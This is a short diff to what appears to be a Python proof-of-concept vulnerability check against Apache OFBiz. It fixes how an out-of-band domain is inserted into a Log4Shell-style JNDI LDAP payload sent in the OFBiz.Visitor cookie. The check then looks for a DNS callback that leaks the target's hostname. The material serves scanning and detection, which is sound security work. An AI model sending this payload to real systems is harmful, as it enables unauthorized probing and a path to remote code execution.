@@ -42,7 +42,7 @@ def poc(url):
         path = """/webtools/control/main"""
         method = "GET"
         data = """"""
-        headers = {'Cookie': 'OFBiz.Visitor=${jndi:ldap://${hostName}.oob_domain}'}
+        headers = {'Cookie': 'OFBiz.Visitor=${jndi:ldap://${hostName}.%s}' % oob_domain}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if verify_request(type="dns", flag=flag):
